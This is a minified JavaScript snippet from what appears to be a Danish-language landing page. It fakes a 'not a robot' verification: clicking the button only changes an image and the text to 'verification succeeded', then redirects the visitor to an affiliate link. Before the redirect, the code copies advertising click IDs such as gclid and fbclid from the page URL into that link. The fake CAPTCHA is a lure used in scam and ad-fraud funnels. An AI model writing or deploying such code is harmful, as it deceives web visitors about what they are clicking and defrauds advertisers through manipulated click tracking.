var btn1=document.getElementById("btn1"),btn1Img=document.getElementById("btn1Img"),titleElement=document.getElementById("title"),title1="Bekræfter at du ikke er en robot…",title2="Verifikation lykkedes, vent venligst…",checkImg="https://cdn.jsdelivr.net/gh/KmCiq7e/5aGZRa/img/checkImgDk.webp",origiImg="https://cdn.jsdelivr.net/gh/KmCiq7e/5aGZRa/img/btn1ImgDk.webp";document.addEventListener("DOMContentLoaded",(function(){var t=new URLSearchParams(window.location.search),e=t.get("gclid")||t.get("gbraid")||t.get("wbraid")||t.get("msclkid")||t.get("fbclid"),n=afflink;if(e){var i=-1!==n.indexOf("?")?"&":"?";n+=i+sub1+"="+encodeURIComponent(e)+"&"+sub2+"="+sub2Info+"&"+sub3+"="+sub3Info}btn1.addEventListener("click",(function(){btn1Img.src=checkImg,setTimeout((()=>{titleElement.textContent=title2}),400),setTimeout((()=>{btn1Img.src=origiImg,titleElement.textContent=title1}),9e3),window.location.href=n}))}));